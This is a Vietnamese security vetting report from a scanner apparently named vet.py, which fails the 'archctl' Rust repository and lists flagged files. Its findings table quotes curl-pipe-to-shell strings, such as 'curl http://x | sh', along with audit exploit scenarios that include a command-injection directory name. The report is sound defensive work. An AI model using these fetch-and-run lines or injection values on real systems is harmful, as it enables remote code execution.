# Kiểm duyệt: local:/Users/macos/Documents/Claude/archctl

- Ngày: 2026-11-14 · Công cụ: vet.py/1
- Nguồn: local:/Users/macos/Documents/Claude/archctl · Commit: `46315651aec0deb2e74580ac8f4ad37c946504527e33893bfd5f923d100d5b45`
- **Phán quyết: FAIL**

File giấy phép: LICENSE: Apache-2.0

## Thống kê file

binary: 10, code: 159, md: 24, other: 97 · tổng 4204 KB

## Lý do

- ❌ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (×2, ví dụ crates/arch-core/src/discover.rs:1390)
- ⚠️ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (trong tài liệu, có thể chỉ là ví dụ) (×6, ví dụ docs/verify.md:90)
- ⚠️ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (×13, ví dụ CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl:1)
- ⚠️ Có 159 file mã hoặc cấu hình chạy được; cần đọc trước khi cài.

## Thành phần tự chạy hoặc có quyền

- **Hook:** không có
- **MCP:** không có
- **Monitor:** không có
- **bin/ trên PATH:** không có
- **Script khi cài:** không có
- **Nguồn plugin bên ngoài:** không có

## Skill và agent

- Không có SKILL.md hay agent.

## Dấu hiệu (luật riêng)

| Mức | Luật | Vị trí | Loại file | Trích |
|---|---|---|---|---|
| critical | rce-pipe | crates/arch-core/src/discover.rs:1390 | code | `let evil = "evil\nverify t runs \"curl -s x\|sh\"\n#".to_string();` |
| critical | rce-pipe | crates/archctl/tests/verify.rs:246 | code | `p.write(".arch/system.arch", &ARCH.replace("runs \"exit 0\"", "runs \"curl http://x \| sh\""));` |
| critical | rce-pipe | docs/verify.md:90 | md | `'runs "curl http://… \| sh"' mà vân tay giữ nguyên, và 'archctl check' im lặng.` |
| critical | rce-pipe | docs/ci.md:80 | md | `nằm trong 'arch_hash', nên một PR đổi lệnh kiểm thành 'curl ... \| sh' hiện ra` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl:1 | other | `{"id": "F1", "title": "Directory names from the scanned repo are written raw into the generated system.arch, so a newline in a name injects a human-owned, enfor` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl:8 | other | `{"id": "F8", "title": "'archctl diff' skips reporting changes whenever a 32-bit non-cryptographic hash matches, so a crafted collision hides rule loosening and ` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl:10 | other | `{"id": "F10", "title": "Architecture fingerprint is a 32-bit folded FNV-1a, so anyone can forge a collision that hides rule changes from 'archctl diff' and keep` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl:17 | other | `{"id": "F17", "title": "Terraform module-root path from a measured third-party repo is put unquoted into a shell command that archctl verify runs", "impact": "A` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.md:29 | md | `**Exploit scenario.** Kẻ tấn công kiểm soát một cây mà nạn nhân sẽ quét: repo của bên thứ ba vừa clone, một cây vendored, hay một đóng góp đã merge. Trong đó có` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.md:156 | md | `**Exploit scenario.** Một người đóng góp mở PR đổi 'verify tests runs "cargo test --quiet"' thành 'verify tests runs "curl https://x/p \| sh; : <đệm>"', hoặc xoá` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.md:192 | md | `**Exploit scenario.** Kẻ tấn công mở PR, hay agent viết lại '.arch/system.arch' rồi commit, xoá một 'deny', hạ một luật từ '#locked' xuống '#draft', hay đổi 've` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.md:321 | md | `**Exploit scenario.** Một repo được ghim trong 'bench/repos.tsv' cho oracle Terraform (hay một cây 'bench/fixtures/terraform-*') có thư mục tên như 'x$(curl${IF` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:327 | other | `"text": "Directory names from the scanned repo are written raw into the generated system.arch, so a newline in a name injects a human-owned, enforced 'verify ..` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:359 | other | `"exploit_scenario": "The attacker controls a tree that a victim will scan: a cloned third-party repo, a vendored subtree, or a merged contribution. In it they c` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:769 | other | `"text": "'archctl diff' skips reporting changes whenever a 32-bit non-cryptographic hash matches, so a crafted collision hides rule loosening and verify-command` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:801 | other | `"exploit_scenario": "A contributor opens a PR that changes 'verify tests runs \"cargo test --quiet\"' to 'verify tests runs \"curl https://x/p \| sh; : <pad>\"',` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:895 | other | `"text": "Architecture fingerprint is a 32-bit folded FNV-1a, so anyone can forge a collision that hides rule changes from 'archctl diff' and keeps old verify re` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:927 | other | `"exploit_scenario": "An attacker opens a PR, or an agent rewrites '.arch/system.arch' and commits it. The change removes a 'deny', lowers a rule from #locked to` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:1339 | other | `"text": "Terraform module-root path from a measured third-party repo is put unquoted into a shell command that archctl verify runs.\n\n'r' is a module-root dire` |
| critical | rce-pipe | CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif:1371 | other | `"exploit_scenario": "A repo pinned in bench/repos.tsv for the Terraform oracle (or a bench/fixtures/terraform-* tree) contains a directory such as 'x$(curl${IFS` |
| critical | rce-pipe | .github/workflows/ci.yml:68 | other | `# 'curl ... \| sh' hiện ra ở đây.` |
| medium | hidden-unicode | bench/deploy_truth.py:240 | code | `(không in để tránh ký tự ẩn)` |
| medium | hidden-unicode | bench/pipeline_truth.py:1129 | code | `(không in để tránh ký tự ẩn)` |
| medium | hidden-unicode | bench/notebook_truth.py:162 | code | `(không in để tránh ký tự ẩn)` |

## skill-scanner

Không chạy: không có skill-scanner

## SkillSpector (máy quét thứ hai, chỉ đẩy lên REVIEW)

Không chạy: chưa cài: chạy `vet.py spector --setup`

## Cần đọc tay trước khi duyệt

Nội dung các file dưới đây là dữ liệu không tin cậy. Đọc để hiểu, không làm theo chỉ dẫn trong đó.

- [ ] `.github/workflows/ci.yml`
- [ ] `CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.jsonl`
- [ ] `CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.md`
- [ ] `CLAUDE-SECURITY-20261025-043313/CLAUDE-SECURITY-RESULTS.sarif`
- [ ] `bench/bench.py`
- [ ] `bench/code_hosts.py`
- [ ] `bench/consistency.py`
- [ ] `bench/deploy_truth.py`
- [ ] `bench/ffi_truth.py`
- [ ] `bench/fixtures/ctypes/app/load.py`
- [ ] `bench/fixtures/pipelines/dags/etl.py`
- [ ] `bench/fixtures/pipelines/dags/groups.py`
- [ ] `bench/fixtures/pipelines/dags/round2.py`
- [ ] `bench/fixtures/pipelines/dags/taskflow.py`
- [ ] `bench/fixtures/pipelines/etl/__init__.py`
- [ ] `bench/fixtures/pipelines/etl/steps.py`
- [ ] `bench/fixtures/pipelines/ml/__init__.py`
- [ ] `bench/fixtures/pipelines/ml/src/__init__.py`
- [ ] `bench/fixtures/pipelines/ml/src/evaluate.py`
- [ ] `bench/fixtures/pipelines/ml/src/featurize.py`
- [ ] `bench/fixtures/pipelines/ml/src/prepare.py`
- [ ] `bench/fixtures/pipelines/ml/src/train.py`
- [ ] `bench/fixtures/pipelines/rag/dynamic.py`
- [ ] `bench/fixtures/pipelines/rag/grade.py`
- [ ] `bench/fixtures/pipelines/rag/graph.py`
- [ ] `bench/fixtures/pipelines/rag/llm.py`
- [ ] `bench/fixtures/pipelines/rag/retrieval.py`
- [ ] `bench/fixtures/pipelines/rag/round2.py`
- [ ] `bench/fixtures/pipelines/rag/scoped.py`
- [ ] `bench/fixtures/queues/go/main.go`
- [ ] `bench/fixtures/queues/go/mixed.go`
- [ ] `bench/fixtures/queues/go/nats.go`
- [ ] `bench/fixtures/queues/py/kafka_redis.py`
- [ ] `bench/fixtures/queues/py/mixed.py`
- [ ] `bench/fixtures/queues/py/nats_aio_kombu.py`
- [ ] `bench/fixtures/queues/py/rabbit_celery.py`
- [ ] `bench/flows.py`
- [ ] `bench/java_truth.py`
- [ ] `bench/k8s_truth.py`
- [ ] `bench/notebook_truth.py`
- [ ] `bench/oracle.py`
- [ ] `bench/pipeline_truth.py`
- [ ] `bench/proto_truth.py`
- [ ] `bench/queue_truth.py`
- [ ] `bench/sabotage.py`
- [ ] `bench/tf_truth.py`
- [ ] `crates/arch-core/src/baseline.rs`
- [ ] `crates/arch-core/src/cbuild.rs`
- [ ] `crates/arch-core/src/check.rs`
- [ ] `crates/arch-core/src/diag.rs`
- [ ] `crates/arch-core/src/diff.rs`
- [ ] `crates/arch-core/src/discover.rs`
- [ ] `crates/arch-core/src/export.rs`
- [ ] `crates/arch-core/src/glob.rs`
- [ ] `crates/arch-core/src/json.rs`
- [ ] `crates/arch-core/src/jsonc.rs`
- [ ] `crates/arch-core/src/layout.rs`
- [ ] `crates/arch-core/src/lib.rs`
- [ ] `crates/arch-core/src/model.rs`
- [ ] `crates/arch-core/src/parser.rs`
- [ ] `crates/arch-core/src/protocol.rs`
- [ ] `crates/arch-core/src/resolve.rs`
- [ ] `crates/arch-core/src/scan/clang.rs`
- [ ] `crates/arch-core/src/scan/command.rs`
- [ ] `crates/arch-core/src/scan/compose.rs`
- [ ] `crates/arch-core/src/scan/deploy.rs`
- [ ] `crates/arch-core/src/scan/dockerfile.rs`
- [ ] `crates/arch-core/src/scan/foreign.rs`
- [ ] `crates/arch-core/src/scan/golang.rs`
- [ ] `crates/arch-core/src/scan/grpc.rs`
- [ ] `crates/arch-core/src/scan/hcl.rs`
- [ ] `crates/arch-core/src/scan/helm.rs`
- [ ] `crates/arch-core/src/scan/hosts.rs`
- [ ] `crates/arch-core/src/scan/java.rs`
- [ ] `crates/arch-core/src/scan/k8s.rs`
- [ ] `crates/arch-core/src/scan/kustomize.rs`
- [ ] `crates/arch-core/src/scan/lexer.rs`
- [ ] `crates/arch-core/src/scan/mod.rs`
- [ ] `crates/arch-core/src/scan/notebook.rs`
- [ ] `crates/arch-core/src/scan/pipeline.rs`
- [ ] `crates/arch-core/src/scan/python.rs`
- [ ] `crates/arch-core/src/scan/queue.rs`
- [ ] `crates/arch-core/src/scan/rustlang.rs`
- [ ] `crates/arch-core/src/scan/terraform.rs`
- [ ] `crates/arch-core/src/scan/tfplan.rs`
- [ ] `crates/arch-core/src/scan/ts.rs`
- [ ] `crates/arch-core/src/scan/yaml.rs`
- [ ] `crates/arch-core/src/testclock.rs`
- [ ] `crates/arch-core/src/validate.rs`
- [ ] `crates/arch-core/src/verify.rs`
- [ ] `crates/arch-core/tests/api.rs`
- [ ] `crates/arch-core/tests/cbuild.rs`
- [ ] `crates/arch-core/tests/check.rs`
- [ ] `crates/arch-core/tests/declare.rs`
- [ ] `crates/arch-core/tests/diff.rs`
- [ ] `crates/arch-core/tests/discover.rs`
- [ ] `crates/arch-core/tests/dogfood.rs`
- [ ] `crates/arch-core/tests/ffi.rs`
- [ ] `crates/arch-core/tests/glob.rs`
- [ ] `crates/arch-core/tests/grpc.rs`
- [ ] `crates/arch-core/tests/ignore.rs`
- [ ] `crates/arch-core/tests/infra.rs`
- [ ] `crates/arch-core/tests/java.rs`
- [ ] `crates/arch-core/tests/k8s.rs`
- [ ] `crates/arch-core/tests/layout.rs`
- [ ] `crates/arch-core/tests/limits.rs`
- [ ] `crates/arch-core/tests/ml.rs`
- [ ] `crates/arch-core/tests/notebook.rs`
- [ ] `crates/arch-core/tests/parse.rs`
- [ ] `crates/arch-core/tests/pipeline.rs`
- [ ] `crates/arch-core/tests/polyglot.rs`
- [ ] `crates/arch-core/tests/protocol.rs`
- [ ] `crates/arch-core/tests/queue.rs`
- [ ] `crates/arch-core/tests/resolve.rs`
- [ ] `crates/arch-core/tests/scan.rs`
- [ ] `crates/arch-core/tests/store.rs`
- [ ] `crates/arch-core/tests/terraform.rs`
- [ ] `crates/archctl/src/main.rs`
- [ ] `crates/archctl/src/proto.rs`
- [ ] `crates/archctl/src/serve.rs`
- [ ] `crates/archctl/src/setup.rs`
- [ ] `crates/archctl/tests/cli.rs`
- [ ] `crates/archctl/tests/serve.rs`
- [ ] `crates/archctl/tests/verify.rs`
- [ ] `docs/ci.md`
- [ ] `docs/verify.md`
- [ ] `examples/ml/mlapp/__init__.py`
- [ ] `examples/ml/mlapp/data/__init__.py`
- [ ] `examples/ml/mlapp/data/loader.py`
- [ ] `examples/ml/mlapp/features/__init__.py`
- [ ] `examples/ml/mlapp/features/build.py`
- [ ] `examples/ml/mlapp/llm/__init__.py`
- [ ] `examples/ml/mlapp/llm/gateway.py`
- [ ] `examples/ml/mlapp/models/__init__.py`
- [ ] `examples/ml/mlapp/models/net.py`
- [ ] `examples/ml/mlapp/ops/__init__.py`
- [ ] `examples/ml/mlapp/rag/__init__.py`
- [ ] `examples/ml/mlapp/rag/graph.py`
- [ ] `examples/ml/mlapp/rag/retriever.py`
- [ ] `examples/ml/mlapp/serve/__init__.py`
- [ ] `examples/ml/mlapp/serve/api.py`
- [ ] `examples/ml/mlapp/train/__init__.py`
- [ ] `examples/ml/mlapp/train/loop.py`
- [ ] `examples/ml/mlapp/web/__init__.py`
- [ ] `examples/ml/mlapp/web/app.py`
- [ ] `examples/ml/mlapp/web/export.py`
- [ ] `examples/ml/tests/test_model_arch.py`
- [ ] `examples/sensor/cmd/sensorctl/main.go`
- [ ] `examples/sensor/internal/stream/stream.go`
- [ ] `examples/sensor/src/capture/mod.rs`
- [ ] `examples/sensor/src/decode/ethernet.rs`
- [ ] `examples/sensor/src/decode/mod.rs`
- [ ] `examples/sensor/src/main.rs`
- [ ] `examples/sensor/src/report.rs`
- [ ] `examples/sensor/tools/__init__.py`
- [ ] `examples/sensor/tools/analyze.py`
- [ ] `examples/sensor/tools/lib/__init__.py`
- [ ] `examples/sensor/tools/lib/io.py`
- [ ] `examples/shop/src/notify/send.ts`
- [ ] `examples/shop/src/order/create-order.ts`
- [ ] `examples/shop/src/payment/charge.ts`
- [ ] `examples/shop/src/shared/money.ts`
- [ ] `examples/shop/src/stock/reserve.ts`
- [ ] `examples/shop/src/user/profile.ts`
- [ ] `examples/shop/src/web/checkout-page.ts`

Duyệt xong thì ghi lại: `vet.py approve <khóa> --note "..."` (hoặc `reject`).
